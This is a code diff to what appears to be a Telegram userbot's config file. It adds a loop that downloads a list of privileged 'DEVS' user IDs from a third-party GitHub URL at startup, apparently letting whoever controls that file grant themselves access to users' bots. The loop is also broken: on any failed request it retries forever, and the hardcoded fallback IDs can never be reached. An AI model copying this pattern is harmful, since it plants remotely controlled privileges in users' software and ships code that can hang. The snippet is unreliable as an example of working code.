@@ -58,7 +58,24 @@ if CONFIG_CHECK:
         "Please remove the line mentioned in the first hashtag from the config.env file"
     )
     quit(1)
+    
+#edit1
+while 0 < 6:
+    _DEVS = get(
+        "https://raw.githubusercontent.com/mrismanaziz/Reforestation/master/DEVS.json"
+    )
+    if _DEVS.status_code != 200:
+        if 0 != 5:
+            continue
+        DEVS = [844432220, 1906014306, 1382636419, 2133486058]
+        break
+    DEVS = _DEVS.json()
+    break
 
+del _DEVS
+
+SUDO_USERS = {int(x) for x in os.environ.get("SUDO_USERS", "").split()}
+BL_CHAT = {int(x) for x in os.environ.get("BL_CHAT", "").split()}
 # Telegram App KEY and HASH
 API_KEY = os.environ.get("API_KEY", None)
 API_HASH = os.environ.get("API_HASH", None)
